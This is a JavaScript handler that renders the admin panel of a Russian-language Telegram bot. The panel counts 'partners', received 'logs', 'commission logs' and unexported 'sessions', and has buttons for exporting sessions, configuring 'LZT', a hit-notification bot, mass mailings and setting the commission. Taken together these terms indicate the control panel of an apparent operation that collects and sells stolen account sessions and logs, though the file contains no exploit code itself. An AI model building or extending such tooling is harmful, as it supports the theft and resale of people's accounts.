import commission from "../../../database/schemas/commission.js";
import { bot } from "../../index.js";
import Database from "../../../database/index.js";
import config from '../../../../config.json' assert { type: 'json' };
import {declineDays} from "../../../utils/index.js";
import TelegramBot from "node-telegram-bot-api";
import log from "../../../database/schemas/log.js";

export default {
    name: "admin",
    async exec(query) {
        const statistics = await Database.getStatisticProject();
        const openedProjectDate = new Date(config.opened_project_date.split('.').reverse().join('-'));
        const registeredDays = Math.floor((Date.now() - openedProjectDate) / (1000 * 60 * 60 * 24));
        const openedProjectDays = declineDays(registeredDays);


        await bot.editMessageCaption(query, `*💻 Административная панель*

*Комиссия:* \`Каждый ${(await commission.findOneAndUpdate({}, { $inc: { value: 0 }}, { upsert: true, new: true })).value} лог\`

>*🧑‍Партнеров:*
>За сегодня: \`${statistics.users.d}\`
>За месяц: \`${statistics.users.m}\`
>За всё время: \`${statistics.users.all}\`

>*📊 Получено логов:*
>За сегодня: ${statistics.logs.d}
>За месяц: ${statistics.logs.m}
>За всё время: ${statistics.logs.all}

> *💰Комиссионных логов:*
>За сегодня: ${statistics.commissionLogs.d}
>За месяц: ${statistics.commissionLogs.m}
>За все время: ${statistics.commissionLogs.all}


*📝 Время работы:* ${openedProjectDays}
*📁 Не выгруженных сессий:* ${await log.countDocuments({ bot: 'com', exported: false })}`, {
            parse_mode: 'MarkdownV2',
            message_id: query.message.message_id,
            chat_id: query.message.chat.id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "📩 Выгрузить",
                            callback_data: 'export:com'
                        }
                    ],
                    [
                        {
                            text: "⚙️ Настоить LZT",
                            callback_data: 'lztadmin'
                        },
                        {
                            text: '🔔 Отстук',
                            url: `https://t.me/${((await new TelegramBot(config.notify_token, {polling: false}).getMe())).username}`
                        }
                    ],
                    [
                        {
                            text: "📢 Рассылка",
                            callback_data: 'mailer'
                        }
                    ],
                    [
                        {
                            text: '👤 Найти пользователя',
                            callback_data: 'find'
                        }
                    ],
                    [
                        {
                            text: '🧾 Изменить комиссию',
                            callback_data: 'procent:a'
                        }
                    ]
                ]
            }
        }, 'cdn/admin.png');
    }
}